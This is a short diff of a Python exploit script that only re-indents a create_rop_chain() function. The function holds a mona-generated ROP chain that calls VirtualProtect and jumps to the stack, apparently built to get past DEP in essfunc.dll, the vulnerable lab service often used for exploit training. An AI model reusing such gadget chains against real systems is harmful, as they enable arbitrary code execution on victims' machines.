@@ -55,10 +55,10 @@ def create_rop_chain():
 
 	# !mona rop -m *.dll -cp nonull
 
-  	rop_gadgets = [
-	    0x76e83b80,  # POP ECX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
-	    0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
-	    0x76a0fd52,  # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] ** REBASED ** ASLR 
+	rop_gadgets = [
+		0x76e83b80,  # POP ECX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
+		0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
+		0x76a0fd52,  # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] ** REBASED ** ASLR 
 		0x7719054d,  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
 		0x625011af,  # & jmp esp [essfunc.dll]
 		0x76e90990,  # POP EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
@@ -76,8 +76,8 @@ def create_rop_chain():
 		0x7727a30c,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR 
 		0x90909090,  # nop
 		0x7707e180,  # PUSHAD # RETN [kernel32.dll] ** REBASED ** ASLR 
-  	]
-  	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
+	]
+	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
 
 rop_chain = create_rop_chain()
 
